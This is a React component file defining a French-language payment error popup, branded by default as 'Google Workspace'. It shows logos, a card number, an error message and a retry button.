import React from 'react';
import { createPortal } from 'react-dom';
import PopupHeader from '../common/PopupHeader';
import styles from '../../styles/components/CommonPopup.module.css';

const PaymentErrorPopup = ({ 
  isVisible, 
  cardLogo, 
  data, 
  onRetry,
  isLoading,
  cardNumber,
  errorMessage,
  brandName = "Google Workspace" 
}) => {
  if (!isVisible) return null;

  const popupContent = (
    <div className={styles.popupWrapper}>
      <div className={`${styles.popup} ${styles.errorPopup}`}>
        <PopupHeader 
          showGoogleLogo={true} 
          showCardLogo={true}
          cardNumber={cardNumber}
        />
        
        <div className={styles.errorContent}>
          <div className={styles.errorIconContainer}>
            <span className={styles.errorIcon}>❌</span>
          </div>
          
          <h2 className={styles.errorTitle}>Erreur de paiement</h2>
          
          <p className={styles.errorDescription}>
            {errorMessage || data?.checkoutPayErrorDescription || "Une erreur est survenue lors du traitement de votre paiement."}
          </p>
          
          <button 
            onClick={onRetry} 
            disabled={isLoading}
            className={styles.retryButton}
          >
            {data?.checkoutPayRetryButton || "Réessayer"}
          </button>
        </div>
      </div>
    </div>
  );

  // Utiliser createPortal pour rendre le popup à la racine du document
  return typeof window !== 'undefined' 
    ? createPortal(popupContent, document.body)
    : null;
};

export default PaymentErrorPopup;
